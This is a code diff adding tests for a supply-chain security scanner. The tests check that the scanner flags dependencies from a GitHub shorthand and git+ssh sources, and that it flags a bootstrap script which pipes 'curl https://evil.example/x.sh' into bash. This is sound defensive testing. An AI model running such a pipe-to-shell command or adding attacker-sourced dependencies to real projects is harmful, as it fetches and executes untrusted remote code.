@@ -107,6 +107,78 @@ test('check-security flags a committed private key', () => {
   }
 });
 
+test('check-security flags a github: shorthand dependency', () => {
+  const target = makeRepo('forgeai-sec-github-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.writeFileSync(
+      path.join(target, 'package.json'),
+      JSON.stringify({ name: 'x', dependencies: { badgh: 'github:attacker/repo' } }, null, 2)
+    );
+    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 1);
+    assert.match(stdout, /risk\s+package\.json.*badgh/);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security flags a git+ssh: dependency', () => {
+  const target = makeRepo('forgeai-sec-gitssh-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.writeFileSync(
+      path.join(target, 'package.json'),
+      JSON.stringify({ name: 'x', dependencies: { badssh: 'git+ssh://git@x/evil.git' } }, null, 2)
+    );
+    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 1);
+    assert.match(stdout, /risk\s+package\.json.*badssh/);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security flags pipe-to-shell in an extensionless script with a shebang', () => {
+  const target = makeRepo('forgeai-sec-shebang-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.mkdirSync(path.join(target, 'scripts'), { recursive: true });
+    fs.writeFileSync(
+      path.join(target, 'scripts', 'bootstrap'),
+      '#!/usr/bin/env bash\ncurl https://evil.example/x.sh | bash\n'
+    );
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 1);
+    assert.match(stdout, /risk\s+scripts[/\\]bootstrap/);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security does not flag a postinstall with curl but no pipe', () => {
+  const target = makeRepo('forgeai-sec-curlnopipe-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.writeFileSync(
+      path.join(target, 'package.json'),
+      JSON.stringify(
+        { name: 'x', scripts: { postinstall: 'curl -o data.json https://api.example.com/data' } },
+        null,
+        2
+      )
+    );
+    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 0);
+    assert.match(stdout, /Result: supply-chain safety check passed\./);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
 test('check-security suppresses an off-registry dependency listed as an approved exception', () => {
   const target = makeRepo('forgeai-sec-exception-');
   try {
